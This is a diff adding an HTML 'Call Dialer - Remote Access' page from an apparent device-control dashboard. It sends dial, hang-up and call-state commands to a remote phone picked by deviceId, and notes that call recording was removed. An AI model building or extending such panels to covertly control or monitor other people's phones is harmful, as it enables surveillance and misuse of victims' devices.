@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Call Dialer - Remote Access</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: #f0f2f5;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            margin: 0 0 10px 0;
+            color: #333;
+            text-align: center;
+        }
+
+        .status-bar {
+            text-align: center;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 8px;
+            font-weight: 600;
+            background: #e3f2fd;
+            color: #1976d2;
+        }
+
+        .status-bar.ringing {
+            background: #fff3e0;
+            color: #f57c00;
+        }
+
+        .status-bar.offhook {
+            background: #c8e6c9;
+            color: #388e3c;
+        }
+
+        .number-display {
+            text-align: center;
+            font-size: 32px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            min-height: 60px;
+            background: #fafafa;
+            color: #333;
+            font-family: monospace;
+        }
+
+        .dialpad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .dialpad-btn {
+            padding: 20px;
+            font-size: 24px;
+            font-weight: 600;
+            border: 2px solid #e0e0e0;
+            border-radius: 50%;
+            background: white;
+            color: #333;
+            cursor: pointer;
+            transition: all 0.2s;
+            aspect-ratio: 1;
+        }
+
+        .dialpad-btn:hover {
+            background: #f5f5f5;
+            border-color: #4caf50;
+        }
+
+        .dialpad-btn:active {
+            transform: scale(0.95);
+        }
+
+        .dialpad-btn.special {
+            font-size: 18px;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+            margin: 20px 0;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-call {
+            background: #4caf50;
+            color: white;
+        }
+
+        .btn-call:hover {
+            background: #45a049;
+        }
+
+        .btn-clear {
+            background: #ff5722;
+            color: white;
+        }
+
+        .btn-clear:hover {
+            background: #e64a19;
+        }
+
+        .btn-record {
+            background: #2196f3;
+            color: white;
+        }
+
+        .btn-record:hover {
+            background: #1976d2;
+        }
+
+        .btn-record.recording {
+            background: #f44336;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.7;
+            }
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .recordings-section {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 2px solid #f0f0f0;
+        }
+
+        .recordings-list {
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .recording-item {
+            padding: 12px;
+            margin: 8px 0;
+            background: #f9f9f9;
+            border-radius: 6px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .recording-info {
+            flex: 1;
+        }
+
+        .recording-name {
+            font-weight: 600;
+            color: #333;
+        }
+
+        .recording-meta {
+            font-size: 12px;
+            color: #666;
+            margin-top: 4px;
+        }
+
+        .btn-download {
+            padding: 8px 16px;
+            background: #4caf50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .btn-download:hover {
+            background: #45a049;
+        }
+
+        .back-link {
+            display: inline-block;
+            margin-bottom: 20px;
+            color: #4caf50;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        .warning {
+            background: #fff3cd;
+            border-left: 4px solid #ffab00;
+            padding: 12px;
+            margin: 15px 0;
+            border-radius: 4px;
+            font-size: 14px;
+            color: #856404;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <a href="/" class="back-link">← Back to Dashboard</a>
+
+        <h1>📞 Call Dialer</h1>
+
+        <div class="status-bar" id="call-status">
+            IDLE - No Active Call
+        </div>
+
+        <div class="number-display" id="number-display">
+            Enter Number
+        </div>
+
+        <div class="dialpad">
+            <button class="dialpad-btn" onclick="addDigit('1')">1</button>
+            <button class="dialpad-btn" onclick="addDigit('2')">2</button>
+            <button class="dialpad-btn" onclick="addDigit('3')">3</button>
+            <button class="dialpad-btn" onclick="addDigit('4')">4</button>
+            <button class="dialpad-btn" onclick="addDigit('5')">5</button>
+            <button class="dialpad-btn" onclick="addDigit('6')">6</button>
+            <button class="dialpad-btn" onclick="addDigit('7')">7</button>
+            <button class="dialpad-btn" onclick="addDigit('8')">8</button>
+            <button class="dialpad-btn" onclick="addDigit('9')">9</button>
+            <button class="dialpad-btn special" onclick="addDigit('*')">*</button>
+            <button class="dialpad-btn" onclick="addDigit('0')">0</button>
+            <button class="dialpad-btn special" onclick="addDigit('#')">#</button>
+        </div>
+
+        <div class="action-buttons" style="margin-bottom: 15px;">
+            <button class="dialpad-btn special" onclick="addDigit('+')">+</button>
+            <button class="dialpad-btn special" onclick="backspace()">⌫</button>
+        </div>
+
+        <div class="action-buttons">
+            <button class="btn btn-call" onclick="dialCall()">📞 Call</button>
+            <button class="btn btn-clear" style="background: #f44336;" onclick="endCall()">⛔ End Call</button>
+            <button class="btn btn-clear" onclick="clearNumber()">🗑️ Clear</button>
+        </div>
+
+        <div class="warning">
+            ⚠️ <strong>Call Recording:</strong> Feature removed by request.
+        </div>
+    </div>
+
+    <script src="/js/api.js"></script>
+    <script>
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+        let currentNumber = '';
+        let callState = 'IDLE';
+        let isRecording = false;
+
+        function addDigit(digit) {
+            currentNumber += digit;
+            updateDisplay();
+        }
+
+        function backspace() {
+            currentNumber = currentNumber.slice(0, -1);
+            updateDisplay();
+        }
+
+        function clearNumber() {
+            currentNumber = '';
+            updateDisplay();
+        }
+
+        function updateDisplay() {
+            const display = document.getElementById('number-display');
+            display.textContent = currentNumber || 'Enter Number';
+        }
+
+        async function dialCall() {
+            if (!currentNumber) {
+                api.showToast('Please enter a phone number', 'error');
+                return;
+            }
+
+            try {
+                const response = await api.sendCommand(deviceId, 'call_dial', {
+                    number: currentNumber
+                });
+
+                if (response.success && response.data && response.data.status === 'success') {
+                    api.showToast(`Dialing ${currentNumber}...`, 'success');
+                } else {
+                    throw new Error(response.error || response.data?.error || 'Failed to dial');
+                }
+            } catch (error) {
+                api.showToast(error.message, 'error');
+            }
+        }
+
+        async function endCall() {
+            try {
+                const response = await api.sendCommand(deviceId, 'call_end');
+
+                if (response.success && response.data && response.data.status === 'success') {
+                    api.showToast('Call ended', 'success');
+                } else {
+                    throw new Error(response.error || response.data?.error || 'Failed to end call');
+                }
+            } catch (error) {
+                api.showToast(error.message, 'error');
+            }
+        }
+        async function updateCallState() {
+            try {
+                const response = await api.sendCommand(deviceId, 'call_state');
+
+                if (response.success && response.data && response.data.status === 'success') {
+                    callState = response.data.state;
+                    isRecording = response.data.isRecording || false;
+
+                    const statusBar = document.getElementById('call-status');
+                    const recordBtn = document.getElementById('record-btn');
+
+                    // Update status display
+                    switch (callState) {
+                        case 'IDLE':
+                            statusBar.textContent = 'IDLE - No Active Call';
+                            statusBar.className = 'status-bar';
+                            break;
+                        case 'RINGING':
+                            statusBar.textContent = 'RINGING - Incoming Call';
+                            statusBar.className = 'status-bar ringing';
+                            break;
+                        case 'OFFHOOK':
+                            statusBar.textContent = 'OFFHOOK - Call Connected';
+                            statusBar.className = 'status-bar offhook';
+                            break;
+                    }
+                }
+            } catch (error) {
+                console.error('Error updating call state:', error);
+            }
+        }
+
+        // Poll call state every 2 seconds
+        setInterval(updateCallState, 2000);
+
+        // Initial load
+        updateCallState();
+    </script>
+</body>
+
+</html>
